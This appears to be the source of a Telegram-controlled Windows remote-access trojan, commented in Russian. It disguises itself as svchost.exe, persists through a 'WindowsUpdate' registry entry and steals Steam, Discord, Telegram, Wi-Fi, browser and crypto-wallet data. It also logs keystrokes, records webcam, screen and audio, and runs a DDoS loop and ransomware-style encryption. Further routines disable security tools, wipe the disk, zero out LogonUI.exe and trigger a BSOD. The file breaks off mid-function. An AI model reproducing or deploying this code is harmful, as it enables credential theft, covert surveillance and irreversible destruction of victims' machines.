import os
import sys
import re
import time
import socket
import platform
import subprocess
import threading
import sqlite3
import json
import base64
import ctypes
import winreg
import shutil
import zipfile
import random
import string
import hashlib
import tempfile
import uuid
from datetime import datetime
from io import BytesIO
from pathlib import Path
from PIL import ImageGrab, Image
import psutil
import requests
import sounddevice as sd
import soundfile as sf
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler

# ============ МНОГОПОЛЬЗОВАТЕЛЬСКАЯ СИСТЕМА ============
known_pcs = []  # Список всех известных ПК
selected_pc = None

# ============ ЗАПРОС ПРАВ АДМИНИСТРАТОРА ============
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        try:
            script = os.path.abspath(sys.argv[0])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
            sys.exit()
        except:
            pass

request_admin()

# ============ АВТО-ПЕРЕИМЕНОВАНИЕ В svchost.exe ============
def rename_to_svchost():
    try:
        exe_path = sys.executable
        exe_dir = os.path.dirname(exe_path)
        new_path = os.path.join(exe_dir, "svchost.exe")
        if not exe_path.lower().endswith("svchost.exe"):
            shutil.copy2(exe_path, new_path)
            os.startfile(new_path)
            sys.exit()
    except:
        pass
rename_to_svchost()

# ============ АВТОМАТИЧЕСКАЯ АВТОЗАГРУЗКА ============
def auto_persistence():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_WRITE
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

auto_persistence()

# ============ КОНФИГ ============
TOKEN = "{{TOKEN}}"
ADMIN_ID = {{ADMIN_ID}}
PC_ID = socket.gethostname() + "_" + os.getlogin()
VERSION = "3.0"

# ============ ОСНОВНЫЕ ФУНКЦИИ ============
def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout if result.stdout else result.stderr
    except:
        return "Error"

def execute_powershell(script):
    try:
        result = subprocess.run(["powershell", "-Command", script], capture_output=True, text=True, timeout=30)
        return result.stdout if result.stdout else result.stderr
    except:
        return "Error"

def get_system_info():
    try:
        return f"""
╔══════════════════════════════════════════╗
║           SYSTEM INFORMATION             ║
╠══════════════════════════════════════════╣
║ PC Name:    {socket.gethostname():<20} ║
║ User:       {os.getlogin():<20} ║
║ OS:         {platform.system()} {platform.release():<10} ║
║ RAM Total:  {round(psutil.virtual_memory().total / (1024**3))} GB ║
║ Disk Total: {round(psutil.disk_usage('/').total / (1024**3))} GB ║
╚══════════════════════════════════════════╝
"""
    except:
        return "System info error"

def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_bytes = BytesIO()
        screenshot.save(img_bytes, format='PNG')
        return img_bytes.getvalue()
    except:
        return None

def block_input(block=True):
    try:
        ctypes.windll.user32.BlockInput(block)
        return "✅ Blocked" if block else "✅ Unblocked"
    except:
        return "❌ Failed"

def minimize_all_windows():
    try:
        ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x44, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
        return "✅ Windows minimized"
    except:
        return "❌ Failed"

def close_active_window():
    try:
        ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x73, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x73, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)
        return "✅ Window closed"
    except:
        return "❌ Failed"

def show_messagebox(text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Alert", 0)
        return "✅ Shown"
    except:
        return "❌ Failed"

def get_location():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        loc = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return f"IP: {ip}\nCountry: {loc.get('country')}\nCity: {loc.get('city')}\nISP: {loc.get('isp')}"
    except:
        return "❌ Location error"

def kill_logonui():
    """Полное уничтожение LogonUI: забивка нулями + блокировка восстановления"""
    try:
        # 1. Убиваем процесс
        os.system("taskkill /f /im LogonUI.exe 2>nul")
        time.sleep(1)
        
        # 2. Путь к файлу
        system32 = os.path.join(os.environ['SystemRoot'], 'System32')
        logonui_path = os.path.join(system32, 'LogonUI.exe')
        
        if not os.path.exists(logonui_path):
            return "❌ LogonUI.exe не найден"
        
        # 3. Снимаем защиту (TrustedInstaller)
        os.system(f'takeown /f "{logonui_path}" 2>nul')
        os.system(f'icacls "{logonui_path}" /grant Administrators:F 2>nul')
        
        # 4. Получаем размер файла
        file_size = os.path.getsize(logonui_path)
        
        # 5. ЗАБИВАЕМ НУЛЯМИ (полная перезапись)
        with open(logonui_path, 'wb') as f:
            f.write(b'\x00' * file_size)  # Каждый байт → 0x00
            f.flush()
            os.fsync(f.fileno())  # Принудительная запись на диск
        
        # 6. Делаем файл системным и скрытым
        os.system(f'attrib +s +h "{logonui_path}" 2>nul')
        
        # 7. Удаляем бэкап (чтобы SFC не восстановил)
        backup_path = os.path.join(system32, 'dllcache', 'LogonUI.exe')
        if os.path.exists(backup_path):
            os.remove(backup_path)
        
        # 8. Дополнительно: блокируем восстановление через DISM
        os.system("dism /online /cleanup-image /restorehealth /limitaccess 2>nul")
        
        return f"💀 LogonUI ЗАБИТ НУЛЯМИ ({file_size} байт)! Экран входа НИКОГДА не появится!"
        
    except Exception as e:
        return f"❌ Ошибка: {e}"

# ============ УСТАНОВКА ОБОЕВ ============
def set_wallpaper(image_path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0x01 | 0x02)
        return f"✅ Wallpaper changed: {image_path}"
    except:
        return "❌ Failed"

def set_wallpaper_from_document(update, context):
    """Устанавливает обои из присланной картинки (без путей)"""
    try:
        chat_id = update.message.chat.id
        doc = update.message.document
        
        if not doc.mime_type or not doc.mime_type.startswith('image/'):
            bot.send_message(chat_id, "❌ Отправь изображение (jpg, png, bmp)")
            return
        
        bot.send_message(chat_id, "⏳ Скачиваю и устанавливаю обои...")
        
        file = bot.get_file(doc.file_id)
        temp_path = os.path.join(os.environ['TEMP'], doc.file_name)
        file.download(temp_path)
        
        result = set_wallpaper(temp_path)
        bot.send_message(chat_id, result)
        
        try:
            os.remove(temp_path)
        except:
            pass
            
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {e}")

# ============ СТАРЫЕ ФУНКЦИИ ============
def steal_steam():
    try:
        data = []
        steam_paths = [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'Steam'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Steam'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'Steam'),
        ]
        for path in steam_paths:
            if os.path.exists(path):
                data.append(f"\n=== Steam found: {path} ===")
                config_path = os.path.join(path, 'config', 'loginusers.vdf')
                if os.path.exists(config_path):
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        data.append(f.read())
                userdata_path = os.path.join(path, 'userdata')
                if os.path.exists(userdata_path):
                    data.append(f"User data: {userdata_path}")
                ssfn_files = [f for f in os.listdir(path) if f.startswith('ssfn')]
                if ssfn_files:
                    data.append(f"SSFN files: {', '.join(ssfn_files)}")
        return "\n".join(data) if data else "Steam not found"
    except Exception as e:
        return f"Error: {e}"

def steal_crypto():
    try:
        data = ["=== Crypto Wallets ==="]
        wallet_paths = [
            os.path.join(os.getenv('APPDATA', ''), 'Electrum'),
            os.path.join(os.getenv('APPDATA', ''), 'Exodus'),
            os.path.join(os.getenv('APPDATA', ''), 'Atomic'),
            os.path.join(os.getenv('APPDATA', ''), 'Zcash'),
            os.path.join(os.getenv('APPDATA', ''), 'Monero'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'MetaMask'),
            os.path.join(os.getenv('APPDATA', ''), 'Coinomi'),
        ]
        for path in wallet_paths:
            if os.path.exists(path):
                data.append(f"\n=== {os.path.basename(path)} ===")
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.dat', '.wallet', '.json', '.key')):
                            data.append(f"  {os.path.join(root, file)}")
        return "\n".join(data) if len(data) > 1 else "No crypto wallets found"
    except Exception as e:
        return f"Error: {e}"

ddos_active = False

def start_ddos(target, duration=60):
    global ddos_active
    if ddos_active:
        return "⚠️ Already running!"
    def attack():
        global ddos_active
        end = time.time() + duration
        while time.time() < end and ddos_active:
            try:
                requests.get(target, timeout=1)
                requests.post(target, timeout=1)
            except:
                pass
        ddos_active = False
    ddos_active = True
    threading.Thread(target=attack).start()
    return f"🔥 DDoS started on {target}"

def stop_ddos():
    global ddos_active
    ddos_active = False
    return "🛑 DDoS stopped"

def kill_process(name):
    try:
        killed = 0
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        return f"✅ Killed {killed} process(es)"
    except:
        return "❌ Error"

def start_process(path):
    try:
        subprocess.Popen([path], shell=True)
        return f"✅ Started: {path}"
    except:
        return f"❌ Failed: {path}"

def list_processes():
    try:
        procs = []
        for proc in psutil.process_iter(['name', 'pid', 'memory_percent']):
            try:
                procs.append(f"{proc.info['pid']}: {proc.info['name']} ({proc.info['memory_percent']:.1f}%)")
            except:
                pass
        return "\n".join(procs[:30])
    except:
        return "Error"

def shutdown_pc():
    os.system("shutdown /s /t 0")
    return "✅ Shutting down..."

def reboot_pc():
    os.system("shutdown /r /t 0")
    return "✅ Rebooting..."

def disable_uac():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ UAC disabled (reboot required)"
    except:
        return "❌ Failed"

def add_persistence():
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return "✅ Persistence added"
    except:
        return "❌ Failed"

def steal_wifi():
    try:
        result = execute_cmd("netsh wlan show profiles")
        passwords = []
        for line in result.split('\n'):
            if "All User Profile" in line:
                name = line.split(':')[1].strip()
                info = execute_cmd(f'netsh wlan show profile name="{name}" key=clear')
                for l in info.split('\n'):
                    if "Key Content" in l:
                        passwords.append(f"{name}: {l.split(':')[1].strip()}")
        return "\n".join(passwords) if passwords else "No WiFi passwords found"
    except:
        return "Error"

def steal_discord():
    try:
        tokens = []
        paths = [
            os.path.join(os.getenv('APPDATA'), 'Discord'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
            os.path.join(os.getenv('APPDATA'), 'DiscordCanary'),
        ]
        for path in paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith('.ldb'):
                            try:
                                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                    matches = re.findall(r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}', f.read())
                                    tokens.extend(matches)
                            except:
                                pass
        return '\n'.join(set(tokens)) if tokens else "No Discord tokens found"
    except:
        return "Error"

def steal_telegram():
    try:
        temp_dir = os.path.join(os.environ['TEMP'], 'tg_sessions')
        os.makedirs(temp_dir, exist_ok=True)
        paths = [
            os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata'),
        ]
        for path in paths:
            if os.path.exists(path):
                shutil.copytree(path, os.path.join(temp_dir, os.path.basename(os.path.dirname(path))), dirs_exist_ok=True)
        zip_path = os.path.join(os.environ['TEMP'], 'telegram_sessions.zip')
        shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_dir)
        shutil.rmtree(temp_dir)
        return zip_path
    except:
        return "Error"

def steal_browser_history():
    try:
        data = []
        browsers = [
            ('Chrome', os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default')),
            ('Edge', os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default')),
            ('Brave', os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')),
        ]
        for name, path in browsers:
            history_path = os.path.join(path, 'History')
            if os.path.exists(history_path):
                try:
                    temp_file = tempfile.mktemp()
                    shutil.copy(history_path, temp_file)
                    conn = sqlite3.connect(temp_file)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY visit_count DESC LIMIT 100")
                    rows = cursor.fetchall()
                    conn.close()
                    os.remove(temp_file)
                    if rows:
                        data.append(f"\n=== {name} History ===")
                        for row in rows:
                            url = row[0] or ''
                            title = row[1] or ''
                            visits = row[2] or 0
                            data.append(f"{visits}x | {title[:50]} | {url[:80]}")
                except:
                    pass
        return "\n".join(data) if data else "No history found"
    except Exception as e:
        return f"Error: {e}"

def record_audio(duration=5):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        filename = f"audio_{datetime.now().strftime('%H%M%S')}.wav"
        full_path = os.path.join(tempfile.gettempdir(), filename)
        sf.write(full_path, recording, fs)
        return full_path
    except:
        return "Error"

def set_volume(level):
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100, None)
        return f"✅ Volume set to {level}%"
    except:
        return "❌ Failed"

def encrypt_files(path, password):
    try:
        if os.path.isfile(path):
            return encrypt_file(path, password)
        elif os.path.isdir(path):
            return encrypt_dir(path, password)
        return "❌ Path not found"
    except Exception as e:
        return f"❌ Error: {e}"

def encrypt_file(file_path, password):
    try:
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        f = Fernet(key)
        with open(file_path, 'rb') as file:
            data = file.read()
        encrypted = f.encrypt(data)
        with open(file_path + '.enc', 'wb') as file:
            file.write(salt + encrypted)
        os.remove(file_path)
        return f"✅ Encrypted: {file_path}"
    except:
        return f"❌ Failed: {file_path}"

def encrypt_dir(dir_path, password):
    count = 0
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if not file.endswith('.enc'):
                try:
                    encrypt_file(os.path.join(root, file), password)
                    count += 1
                except:
                    pass
    return f"✅ Encrypted {count} files"

def decrypt_files(path, password):
    try:
        if os.path.isfile(path) and path.endswith('.enc'):
            return decrypt_file(path, password)
        elif os.path.isdir(path):
            return decrypt_dir(path, password)
        return "❌ Path not found"
    except Exception as e:
        return f"❌ Error: {e}"

def decrypt_file(file_path, password):
    try:
        with open(file_path, 'rb') as file:
            salt = file.read(16)
            encrypted = file.read()
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        f = Fernet(key)
        decrypted = f.decrypt(encrypted)
        original = file_path[:-4]
        with open(original, 'wb') as file:
            file.write(decrypted)
        os.remove(file_path)
        return f"✅ Decrypted: {original}"
    except:
        return f"❌ Failed"

def decrypt_dir(dir_path, password):
    count = 0
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            if file.endswith('.enc'):
                try:
                    decrypt_file(os.path.join(root, file), password)
                    count += 1
                except:
                    pass
    return f"✅ Decrypted {count} files"

def trigger_bsod():
    try:
        ntdll = ctypes.windll.ntdll
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ntdll.NtRaiseHardError(0xC000021A, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
        return "💀 BSOD triggered"
    except:
        return "❌ Failed"

def scare_screen():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.configure(bg='red')
        label = tk.Label(root, text="⚠️ YOUR SYSTEM HAS BEEN HACKED ⚠️", font=('Arial', 40, 'bold'), fg='white', bg='red')
        label.place(relx=0.5, rely=0.5, anchor='center')
        root.after(10000, root.destroy)
        root.mainloop()
        return "👻 Scare screen shown"
    except:
        return "❌ Failed"

def broken_pixels():
    try:
        import tkinter as tk
        import random
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        root.attributes('-transparentcolor', 'black')
        root.configure(bg='black')
        canvas = tk.Canvas(root, bg='black', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        for _ in range(random.randint(50, 150)):
            x = random.randint(0, root.winfo_screenwidth())
            y = random.randint(0, root.winfo_screenheight())
            color = random.choice(['red', 'green', 'blue', 'white', 'yellow', 'magenta'])
            canvas.create_rectangle(x, y, x+2, y+2, fill=color, outline=color)
        root.after(30000, root.destroy)
        root.mainloop()
        return "🖤 Broken pixels effect shown"
    except:
        return "❌ Failed"

def pixellate_screen():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes('-fullscreen', True, '-topmost', True)
        pb = tk.Label(root)
        pb.pack(fill=tk.BOTH, expand=True)
        def update():
            try:
                img = ImageGrab.grab()
                small = img.resize((80, 60), Image.NEAREST)
                big = small.resize(img.size, Image.NEAREST)
                from PIL import ImageTk
                tk_img = ImageTk.PhotoImage(big)
                pb.config(image=tk_img)
                pb.image = tk_img
                root.after(50, update)
            except:
                pass
        update()
        root.after(10000, root.destroy)
        root.mainloop()
        return "🌀 Pixellation effect activated"
    except:
        return "❌ Failed"

def scream_make(video_path):
    try:
        os.system(f'start "" "{video_path}" /fullscreen')
        return f"✅ Video playing: {video_path}"
    except:
        return "❌ Failed"

def download_file(url):
    try:
        filename = url.split('/')[-1].split('?')[0] or 'download'
        full_path = os.path.join(tempfile.gettempdir(), filename)  # <-- TEMP
        response = requests.get(url, timeout=30)
        with open(full_path, 'wb') as f:
            f.write(response.content)
        return f"✅ Downloaded: {full_path}"
    except:
        return "❌ Failed"

def download_file_from_pc(file_path):
    try:
        if os.path.exists(file_path):
            return file_path
        return None
    except:
        return None

def upload_file_to_pc(file_bytes, filename):
    try:
        full_path = os.path.join(tempfile.gettempdir(), filename)  # <-- TEMP
        with open(full_path, 'wb') as f:
            f.write(file_bytes)
        return f"✅ File saved: {full_path}"
    except:
        return "❌ Failed"

def list_files(path):
    try:
        if not os.path.exists(path):
            return "❌ Path not found"
        result = []
        for item in os.listdir(path):
            full = os.path.join(path, item)
            if os.path.isfile(full):
                result.append(f"📄 {item} ({os.path.getsize(full)} bytes)")
            else:
                result.append(f"📁 {item}/")
        return "\n".join(result[:50])
    except:
        return "❌ Error"

def record_screen(duration=10):
    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab
        screen = ImageGrab.grab()
        width, height = screen.size
        filename = f"screen_record_{datetime.now().strftime('%H%M%S')}.avi"
        full_path = os.path.join(tempfile.gettempdir(), filename)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(full_path, fourcc, 10, (width, height))
        for _ in range(duration * 10):
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(0.1)
        out.release()
        return full_path
    except:
        return "Error"

def record_webcam(duration=10):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "❌ Webcam not found"
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"webcam_{datetime.now().strftime('%H%M%S')}.avi"
        full_path = os.path.join(tempfile.gettempdir(), filename)
        out = cv2.VideoWriter(full_path, fourcc, 20, (640, 480))
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        cap.release()
        out.release()
        return full_path
    except:
        return "Error"

class Keylogger:
    def __init__(self):
        self.hook_id = None
        self.log = []
        self.user32 = ctypes.windll.user32
        
    def start(self):
        try:
            WH_KEYBOARD_LL = 13
            WM_KEYDOWN = 0x0100
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int))
            self.hook_proc = HOOKPROC(self._hook_callback)
            self.hook_id = self.user32.SetWindowsHookExW(WH_KEYBOARD_LL, self.hook_proc, None, 0)
            return "✅ Keylogger started"
        except:
            return "❌ Failed"
    
    def _hook_callback(self, nCode, wParam, lParam):
        if nCode >= 0 and wParam == 0x0100:
            key_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_int)).contents.value
            self.log.append(f"0x{key_code:X}")
            if len(self.log) >= 100:
                self._save_log()
        return self.user32.CallNextHookEx(self.hook_id, nCode, wParam, lParam)
    
    def _save_log(self):
        try:
            with open("keylog.txt", "a") as f:
                f.write(f"{datetime.now()}: {' '.join(self.log)}\n")
            self.log.clear()
        except:
            pass
    
    def stop(self):
        if self.hook_id:
            self.user32.UnhookWindowsHookEx(self.hook_id)
            if self.log:
                self._save_log()
            return "✅ Stopped"
        return "❌ Not running"
    
    def dump(self):
        if os.path.exists("keylog.txt"):
            with open("keylog.txt", "r") as f:
                return f.read()
        return "No logs"

keylogger = Keylogger()

# ============ НОВЫЕ ФУНКЦИИ ============
usb_blocked = False

def block_usb():
    global usb_blocked
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
        winreg.CloseKey(key)
        usb_blocked = True
        return "✅ USB-накопители (флешки) ЗАБЛОКИРОВАНЫ!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def unblock_usb():
    global usb_blocked
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 3)
        winreg.CloseKey(key)
        usb_blocked = False
        return "✅ USB-накопители (флешки) РАЗБЛОКИРОВАНЫ!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def usb_status():
    global usb_blocked
    return f"🔌 USB-накопители: {'ЗАБЛОКИРОВАНЫ' if usb_blocked else 'РАБОТАЮТ'}"

def destroy_mbr():
    try:
        with open("destroy.txt", "w") as f:
            f.write("select disk 0\nclean\nconvert gpt\nexit\n")
        subprocess.run(['diskpart', '/s', 'destroy.txt'], capture_output=True, timeout=30)
        os.remove("destroy.txt")
        return "💀 MBR и все разделы УНИЧТОЖЕНЫ! Система НЕ ЗАГРУЗИТСЯ!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def stress_gpu(duration=60):
    try:
        try:
            import pycuda.driver as cuda
            import pycuda.autoinit
            from pycuda.compiler import SourceModule
            mod = SourceModule("""
            __global__ void stress() {
                while(1) {
                    int x = threadIdx.x + blockIdx.x * blockDim.x;
                    int y = threadIdx.y + blockIdx.y * blockDim.y;
                    float a = 0.0;
                    for(int i = 0; i < 1000000; i++) {
                        a += sin(x) * cos(y) + tan(x) * atan(y);
                    }
                }
            }
            """)
            func = mod.get_function("stress")
            for _ in range(50):
                func((100, 100, 1), (100, 100, 1))
            return f"🔥 GPU нагружен до предела! ({duration} сек)"
        except:
            return stress_cpu(duration)
    except Exception as e:
        return f"❌ Ошибка: {e}"

def stress_cpu(duration=60):
    import threading
    import math
    def loop():
        end = time.time() + duration
        while time.time() < end:
            math.factorial(100000)
    threads = []
    for _ in range(os.cpu_count()):
        t = threading.Thread(target=loop)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return f"🔥 CPU нагружен до 100%! ({duration} сек)"

def format_disk():
    try:
        drives = [d for d in os.listdir('C:/') if os.path.isdir(d)]
        for drive in drives:
            os.system(f'format {drive}: /q /y')
        return "💀 Все диски отформатированы!"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def get_clipboard():
    try:
        import ctypes
        from ctypes import wintypes
        CF_TEXT = 1
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        user32.OpenClipboard(0)
        try:
            handle = user32.GetClipboardData(CF_TEXT)
            if handle:
                pointer = kernel32.GlobalLock(handle)
                if pointer:
                    data = ctypes.cast(pointer, ctypes.c_char_p).value
                    kernel32.GlobalUnlock(handle)
                    user32.CloseClipboard()
                    return data.decode('utf-8', errors='ignore') if data else "Пусто"
            user32.CloseClipboard()
            return "Пусто"
        except:
            user32.CloseClipboard()
            return "Ошибка чтения буфера"
    except:
        return "❌ Ошибка"

def disable_defender():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "✅ Windows Defender отключён!"
    except:
        return "❌ Ошибка"

def disable_firewall():
    try:
        os.system("netsh advfirewall set allprofiles state off")
        return "✅ Брандмауэр отключён!"
    except:
        return "❌ Ошибка"

def disable_updates():
    try:
        os.system("sc config wuauserv start= disabled")
        os.system("net stop wuauserv")
        return "✅ Обновления Windows отключены!"
    except:
        return "❌ Ошибка"

def disable_system_restore():
    try:
        os.system("vssadmin delete shadows /all /quiet")
        return "✅ Восстановление системы отключено!"
    except:
        return "❌ Ошибка"

def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "✅ Диспетчер задач отключён!"
    except:
        return "❌ Ошибка"

def enable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ Диспетчер задач включён!"
    except:
        return "❌ Ошибка"

def disable_registry_editor():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "✅ Редактор реестра отключён!"
    except:
        return "❌ Ошибка"

def enable_registry_editor():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ Редактор реестра включён!"
    except:
        return "❌ Ошибка"

def disable_cmd():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
        return "✅ CMD отключён!"
    except:
        return "❌ Ошибка"

def enable_cmd():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return "✅ CMD включён!"
    except:
        return "❌ Ошибка"

def change_theme(theme="dark"):
    try:
        if theme == "dark":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "AppsUseLightTheme", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            return "✅ Тёмная тема включена!"
        else:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "AppsUseLightTheme", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            return "✅ Светлая тема включена!"
    except:
        return "❌ Ошибка"

def enable_dark_mode():
    return change_theme("dark")

def disable_dark_mode():
    return change_theme("light")

def enable_high_contrast():
    try:
        os.system("rundll32.exe user32.dll,SetHighContrast 1")
        return "✅ Высокая контрастность включена!"
    except:
        return "❌ Ошибка"

def disable_high_contrast():
    try:
        os.system("rundll32.exe user32.dll,SetHighContrast 0")
        return "✅ Высокая контрастность отключена!"
    except:
        return "❌ Ошибка"

def set_power_scheme(scheme="high"):
    try:
        if scheme == "high":
            os.system("powercfg -setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c")
            return "✅ Высокая производительность"
        else:
